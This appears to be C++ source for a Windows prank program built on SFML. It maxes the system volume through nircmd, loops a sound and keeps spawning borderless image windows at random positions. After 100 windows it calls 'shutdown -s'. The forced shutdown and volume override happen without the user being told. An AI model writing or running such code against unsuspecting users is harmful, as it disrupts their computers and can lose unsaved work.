#include<SFML/Graphics.hpp>
#include<SFML/Audio.hpp>
#include<vector>
#include<windows.h>
#include<cstdlib>

int main()
{
    srand(time(NULL));
    std::vector<sf::RenderWindow*>Windows;
    sf::Texture texture[7];
    sf::Sprite sprite[7];
    sf::Clock clock;
    sf::Time time;
    sf::SoundBuffer buffer;
    buffer.loadFromFile("intro.wav");
    sf::Sound sound;
    sound.setBuffer(buffer);
    system("start nircmd//nircmdc.exe setsysvolume 65534");
    sound.setLoop(true);
    sound.play();
    for(int i=0;i<7;i++)
    {
        std::string file="Textures//s"+std::to_string(7-i)+".jpg";
        texture[i].loadFromFile(file);
        sprite[i].setTexture(texture[i]);
    }
    while (true)
    {
        time=clock.getElapsedTime();
        if(time.asSeconds()>0.5)
        {
            Windows.push_back(new sf::RenderWindow(sf::VideoMode(texture[Windows.size()%7].getSize().x,texture[Windows.size()%7].getSize().y),"",sf::Style::None));
            Windows[Windows.size()-1]->setPosition(sf::Vector2i(std::rand()%1300,std::rand()%800));
            clock.restart();
        }
        for(long long unsigned int i=0;i<Windows.size();i++)
        {
            Windows[i]->clear();
            Windows[i]->draw(sprite[i%7]);
            Windows[i]->display();
        }
        if(Windows.size()>=100)
        {
            system("shutdown -s");
            exit(0);
        }
    }
    return 0;
}
